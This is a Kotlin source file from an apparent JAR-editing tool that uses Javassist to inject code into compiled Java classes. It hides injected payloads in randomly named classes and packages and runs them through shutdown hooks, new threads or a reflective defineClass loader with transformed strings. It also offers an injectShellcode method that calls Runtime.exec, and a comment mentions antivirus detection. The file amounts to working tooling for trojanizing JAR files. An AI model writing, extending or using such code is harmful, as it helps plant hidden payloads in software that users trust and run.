package me.ex4ltado.jareditor.editor.impl

import javassist.CtClass
import me.ex4ltado.jareditor.*
import me.ex4ltado.jareditor.builder.ClassBuilderFactory
import me.ex4ltado.jareditor.editor.ClassEditor
import me.ex4ltado.jareditor.transform.SimpleStringTransform
import me.ex4ltado.jareditor.transform.Transform
import me.ex4ltado.jareditor.util.ClassNameUtil
import me.ex4ltado.jareditor.util.toClassBuilder


/**
 * A ClassEditor implementation that uses Javassist to modify classes.
 *
 * @property classManager The ClassManager to use for creating and storing classes.
 */
class ClassEditorImpl(private val classManager: ClassManager) : ClassEditor {

    private val stringTransform: Transform<String, String> = SimpleStringTransform()

    override fun editMethod(jar: JeFile, code: CodeBuilder, method: JeMethod, mode: ClassEditor.InsertionMode) {

        // Defrost the class to be able to edit it
        if (method.declaringClass.isFrozen) {
            logger.info("Defrosting class: ${method.declaringClass.name}")
            method.declaringClass.defrost()
        }

        logger.info("Modifying method: ${method.name}")

        when (mode) {
            ClassEditor.InsertionMode.SOURCE_BEGIN -> {
                method.insertAt(0, code.toString())
            }

            ClassEditor.InsertionMode.SOURCE_END -> {
                method.insertAfter(code.toString(), true)
            }

            ClassEditor.InsertionMode.SHUTDOWN_HOOK -> {
                val runnable = ClassBuilderFactory.runnableClass(
                    classManager,
                    ClassNameUtil.randomClassName((4..6).random(), 0),
                    jar.getRandomPackage(),
                ) {
                    line(code.toString())
                }

                // Wrapper class to call the shutdown hook
                val wrapper = ClassBuilderFactory.wrapperClass(
                    classManager,
                    ClassNameUtil.randomClassName((4..6).random(), 0),
                    ClassNameUtil.randomMethodName((2..5).random()),
                    jar.getRandomPackage(),
                ) {
                    // Create a new shutdown hook to call the created Runnable class
                    line("Runtime.getRuntime().addShutdownHook(new Thread(new ${runnable.classPath()}()));")
                }

                // Call the wrapper method
                method.insertAt(0, "new ${wrapper.classPath()}().${wrapper.declaredMethods()[0].name}();")

                val runnableBytecode = runnable.toBytecode()
                val wrapperBytecode = wrapper.toBytecode()

                classManager.makeClass(jar, runnableBytecode)
                classManager.makeClass(jar, wrapperBytecode)
                jar.modifyOrPutClass(runnable.className, runnableBytecode)
                jar.modifyOrPutClass(wrapper.className, wrapperBytecode)
            }

            ClassEditor.InsertionMode.NEW_THREAD -> {
                val runnable = ClassBuilderFactory.runnableClass(
                    classManager,
                    ClassNameUtil.randomClassName((4..6).random(), 0),
                    jar.getRandomPackage(),
                ) {
                    line(code.toString())
                }

                method.insertAt(0, "new Thread(new ${runnable.classPath()}()).start();")

                val runnableBytecode = runnable.toBytecode()
                classManager.makeClass(jar, runnableBytecode)

                jar.modifyOrPutClass(runnable.className, runnable.toBytecode())
            }

            ClassEditor.InsertionMode.OVERWRITE -> { // can trigger the AntiVirus I don't know why
                method.setBody(code.toString())
            }
        }

    }

    override fun injectClassLoader(
        jar: JeFile,
        method: JeMethod,
        classPath: String,
        classBytecode: ByteArray,
        methodToInvoke: String,
        mode: ClassEditor.InsertionMode
    ) {

        val classLoaderCode = codeBuilder {

            // Wrap the code in a try-catch block to avoid crashing
            _try(Exception::class.java,
                body = {

                    val varName = "m"

                    // Get the defineClass method from ClassLoader
                    line(
                        "java.lang.reflect.Method $varName = ClassLoader.class.getDeclaredMethod(${
                            stringTransform.transform("defineClass")
                        }, new Class[] { String.class, byte[].class, int.class, int.class });"
                    )
                    // Make the defineClass method accessible
                    line("$varName.setAccessible(true);")

                    // Define the class in the class loader
                    line(
                        "$varName.invoke(ClassLoader.getSystemClassLoader(), new Object[] { ${
                            stringTransform.transform(classPath)
                        }, new byte[] { ${classBytecode.joinToString(",")} }, new Integer(0), new Integer(${classBytecode.size}) });"
                    )

                    // Invoke the method on the loaded class
                    lines(
                        "Class.forName(${stringTransform.transform(classPath)})",
                        ".getMethod(${stringTransform.transform(methodToInvoke)}, null)",
                        ".invoke(Class.forName(${stringTransform.transform(classPath)}).newInstance(), null);"
                    )
                }
            )

        }

        // Inject the class loader code into the method
        editMethod(jar, classLoaderCode, method, mode)
    }

    override fun injectShellcode(jar: JeFile, method: JeMethod, payload: String, mode: ClassEditor.InsertionMode) {
        val code = codeBuilder {
            line("Runtime.getRuntime().exec($payload);")
        }
        editMethod(jar, code, method, mode)
    }

    override fun nullifyMethod(jar: JeFile, method: JeMethod) {
        method.setBody(null)
    }

    // May cause "problems" on modified methods?? need test
    /*@Throws(RuntimeException::class)
    fun renameClass(ctClass: CtClass, newName: String) {

        if (!classCache.containsValue(ctClass))
            throw RuntimeException("CtClass don't found in input classes")

        // TODO: Check if dont exist class with the same given name
        classCache.remove(ctClass.name.normalizeToClassEntry())

        if (ctClass.isFrozen) ctClass.defrost()

        val packagePath = ctClass.packageName
        ctClass.replaceClassName(ctClass.name, newName)
        val key = (if (packagePath != null) "$packagePath." else "") + newName
        classCache[key.normalizeToClassEntry()] = ctClass
    }

    @Throws(RuntimeException::class, NotFoundException::class)
    fun renameClass(oldName: String, newName: String) {
        val ctClass = findCtClassBySimpleName(oldName) ?: throw RuntimeException("CtClass don't found in input classes")
        return renameClass(ctClass, newName)
    }*/

    fun editClass(ctClass: CtClass, block: me.ex4ltado.jareditor.builder.ClassBuilder.() -> Unit) =
        ctClass.toClassBuilder(classManager, block)

}